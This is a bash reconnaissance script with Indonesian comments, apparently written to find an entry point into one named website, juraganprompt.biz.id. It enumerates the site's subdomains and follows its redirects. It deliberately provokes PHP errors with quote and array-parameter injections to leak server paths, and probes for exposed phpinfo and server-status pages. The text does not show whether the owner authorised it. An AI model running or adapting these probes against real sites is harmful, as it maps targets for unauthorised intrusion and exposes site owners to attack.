#!/usr/bin/env bash
# cek6.sh — cari jalan masuk yang benar-benar tersaji:
#  (a) apakah ada subdomain yang docroot-nya di /public_html
#  (b) ke mana 302 /akademi/ mengarah (bisa membocorkan struktur)
#  (c) apakah app akademi yang ONLINE membocorkan path docroot-nya
set -u
T="${LOCALAPPDATA}/Temp/kdcek"; mkdir -p "$T"
B="https://juraganprompt.biz.id"
W() { curl -sS -k --max-time 20 "$@"; }

echo "=== a. DNS subdomain umum ==="
for s in www member app akademi kelas karyawan cpanel mail webmail; do
  ip=$(nslookup "$s.juraganprompt.biz.id" 8.8.8.8 2>/dev/null | awk '/^Address/{a=$2} END{print a}')
  printf '  %-28s %s\n' "$s.juraganprompt.biz.id" "${ip:-tidak ada}"
done

echo
echo "=== b. Location dari 302 ==="
for p in /akademi/ /akademi/kategori.php /akademi/tutorial.php; do
  loc=$(W -D - -o /dev/null "$B$p" 2>/dev/null | grep -i '^location:' | tr -d '\r')
  printf '  %-26s %s\n' "$p" "${loc:-(tidak ada)}"
done

echo
echo "=== c. paksa error PHP di app akademi ONLINE (cari path absolut) ==="
for p in "/akademi/_boot.php" "/akademi/theme.php" "/akademi/setup.php" "/akademi/index.php?id=%27" "/akademi/login.php?x[]=1"; do
  W -o "$T/e.html" -w "  %{http_code} %{size_download}B  $p\n" "$B$p"
  grep -oiE '/home/[a-z0-9_]+/[a-z0-9_/.-]*' "$T/e.html" 2>/dev/null | sort -u | head -4 | sed 's/^/      path: /'
done

echo
echo "=== d. isi halaman /akademi/ (nama app yang online) ==="
W -o "$T/ak.html" -w '  kode=%{http_code}\n' "$B/akademi/login.php"
grep -oE '<title>[^<]*|AKADEMI[A-Z ]*' "$T/ak.html" | sort -u | head -4 | sed 's/^/  /'

echo
echo "=== e. server-status / info yang kadang terbuka ==="
for p in /cgi-sys/defaultwebpage.cgi /.well-known/ /server-status /info.php /phpinfo.php; do
  printf '  %-34s %s\n' "$p" "$(W -o "$T/x.html" -w '%{http_code}/%{size_download}' "$B$p")"
done
